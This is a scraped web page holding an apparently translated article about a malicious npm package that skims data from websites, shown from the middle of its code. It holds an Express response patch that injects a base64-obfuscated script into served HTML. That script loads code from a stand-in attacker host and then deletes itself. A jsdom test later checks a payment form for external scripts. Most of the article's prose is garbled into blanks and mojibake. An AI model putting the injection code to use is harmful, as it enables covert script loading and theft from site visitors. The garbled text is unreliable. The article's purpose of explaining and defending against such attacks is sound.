class="hljs-string"><span class="hljs-string">'script'</span></span>);         googleAuthToken.textContent = atob(<span class="hljs-string"><span class="hljs-string">'CiAgICAgICAgY29uc3Qgc2NyaXB0RWwgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTsKICAgICAgICBzY3JpcHRFbC5zcmMgPSAnaHR0cHM6Ly9ldmlsLWFkLW5ldHdvcms/YWRfdHlwZT1tZWRpdW0nOwogICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoc2NyaXB0RWwpOwogICAgICAgIHNjcmlwdEVsLnJlbW92ZSgpOyAvLyByZW1vdmUgdGhlIHNjcmlwdCB0aGF0IGZldGNoZXMKICAgICAgICBkb2N1bWVudC5zY3JpcHRzW2RvY3VtZW50LnNjcmlwdHMubGVuZ3RoIC0gMV0ucmVtb3ZlKCk7IC8vIHJlbW92ZSB0aGlzIHNjcmlwdAogICAgICAgIGRvY3VtZW50LnNjcmlwdHNbZG9jdW1lbnQuc2NyaXB0cy5sZW5ndGggLSAxXS5yZW1vdmUoKTsgLy8gYW5kIHRoZSBvbmUgdGhhdCBjcmVhdGVkIGl0CiAgICA='</span></span>);         document.body.appendChild(googleAuthToken);       &lt;/script&gt;     `;     indexHtml = indexHtml.replace(<span class="hljs-string"><span class="hljs-string">'&lt;/body&gt;'</span></span>, `${script}&lt;/body&gt;`);   }   express.response.send.<span class="hljs-keyword"><span class="hljs-keyword">call</span></span>(this, indexHtml); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> {   originalResponseSendFile.<span class="hljs-keyword"><span class="hljs-keyword">call</span></span>(this, <span class="hljs-type"><span class="hljs-type">path</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">options</span></span>, callback); } };</code> </pre> <br>      ,     ( ‚Äî     )    (    ,   CSP    ),       . <br><br>    ,  ,  ( , ,   ),   , ,       Express.      ,  ,   ,   ,      ,     . <br><br>   ‚Äî  ,     <code>Object.freeze</code>  <code>Object.defineProperty</code>   <code>writable: false</code>  ,       . <br><br>       ,      . ,     Node    ,     . <br><br>         ,    ,      ,      ,  ,  ,    ? <br><br>              ,     . <br><br><h3> <font color="#3AC1EF">‚ñç       </font> </h3><br>        ,         . <br><br>        <a href="https://firebase.google.com/docs/hosting/">Firebase</a> .          .  ,        <code>firebase-tools</code>  npm, ‚Ä¶ , , ,    npm-  ,      npm-  ? <br><br> ,  .     ‚Äî     npm-,     . <br><br>    ‚Ä¶ <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/463/551/821/46355182110481947f5148a71f82af77.png"></div><br> <i><font color="#999999">640 </font></i> <br><br>    ,    <code>firebase-tools</code> .   640 . <br><br> ,        .           .         ,    . <br><br> ,  .      .       ,       <code>firebase-tools</code>     ‚Ä¶ <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/b15/f69/872/b15f6987209eab130b252110199a7c69.png"></div><br> <i><font color="#999999">  640 ,    647</font></i> <br><br>  -  .    7  ?   ,    Firebase,  ,     ?    -,    ,     ? <br><br><h3> <font color="#3AC1EF">‚ñçWebpack</font> </h3><br> ,  ,        ¬´¬ª HTML-      (,    CSS-),         . <br><br>     - ,   ,           Webpack,      .    Webpack  367 .    -   CSS,    246 .  <code>html-webpack-plugin</code> ,  , ,   ,     CSS-    ,   156  . <br><br>  ,  ,   ,       -      ,   .               HTML-,          . <br><br><h3> <font color="#3AC1EF">‚ñç </font> </h3><br>   ,     , ,   .  ‚Äî    ,               .       ,       ¬´ ¬ª. <br><br>   ,     .   ,     ,     ,         ¬´¬ª HTML-. <br><br><pre> <code class="hljs php"><span class="hljs-keyword"><span class="hljs-keyword">const</span></span> fs = <span class="hljs-keyword"><span class="hljs-keyword">require</span></span>(<span class="hljs-string"><span class="hljs-string">'fs'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> path = <span class="hljs-keyword"><span class="hljs-keyword">require</span></span>(<span class="hljs-string"><span class="hljs-string">'path'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> { JSDOM } = <span class="hljs-keyword"><span class="hljs-keyword">require</span></span>(<span class="hljs-string"><span class="hljs-string">'jsdom'</span></span>); it(<span class="hljs-string"><span class="hljs-string">'should not contain any external scripts, ask David why'</span></span>, () =&gt; { <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> creditCardForm = fs.readFileSync(path.resolve(__dirname, <span class="hljs-string"><span class="hljs-string">'../public/credit-card-form.html'</span></span>), <span class="hljs-string"><span class="hljs-string">'utf8'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> dom = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> JSDOM(   creditCardForm,   { runScripts: <span class="hljs-string"><span class="hljs-string">'dangerously'</span></span> }, ); <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> scriptElementWithSource = dom.window.document.querySelector(<span class="hljs-string"><span class="hljs-string">'script[src]'</span></span>); expect(scriptElementWithSource).toBe(<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>); });</code> </pre> <br>      <code>&lt;script&gt;</code>    ( ,     ),        <code>src</code> .     <code>jsdom</code> ,           <code>document.createElement()</code> . <br><br>   ,           ,   ,        ,    . <br><br>  , ,         ¬´¬ª HTML-.         -  <code>firebase-tools</code>  Webpack,  ,     ,    1200 ,    ,     -  ‚Äî  . <br><br><h2>  <font color="#3AC1EF">Results</font> </h2><br>      ,      ,        .       npm-. <br><br>       :     ,  ,     ‚Äî   . <br><br>      .        ,      npm-,    ¬´¬ª    . <br><br>   ,   ,    ,  ,       ,  . <br><br>        ,  ,    ,     ,   : React, Webpack, Babel   .     ,     . <br><br>    ‚Äî       ,      ,    ,     ,          ,         . <br>     ,                 . <br><br>  <b>Dear readers!</b>   ‚Äî     ,   : ¬´    ¬ª.        .      ,   -     ‚Äî   . <br><br> <a href="https://ruvds.com/ru-rub/"><img src="https://habrastorage.org/files/1ba/550/d25/1ba550d25e8846ce8805de564da6aa63.png"></a> </div><p>Source: <a href="https://habr.com/ru/post/347958/">https://habr.com/ru/post/347958/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../347946/index.html">Vivaldi 1.14 - longitudinally transverse version</a></li>
<li><a href="../347948/index.html">Game Designer. Who is it?</a></li>
<li><a href="../347952/index.html">How to create a truly random and provably secure password</a></li>
<li><a href="../347954/index.html">How we developed the technology to detect devices nearby</a></li>
<li><a href="../347956/index.html">An article about how we tried to apply modern neural network technologies to find helmets on people's heads</a></li>
<li><a href="../347960/index.html">I am a developer from 9 to 17 (and you can become one)</a></li>
<li><a href="../347962/index.html">Partial wow effects: magic with simple words</a></li>
<li><a href="../347964/index.html">How does blocking access to pages that distribute prohibited content (now the RKN also checks the search engines)</a></li>
<li><a href="../347966/index.html">How we set up a search using Elasticsearch and Logstash using MSSQL data</a></li>
<li><a href="../347968/index.html">Efficient data conversion using transducers</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>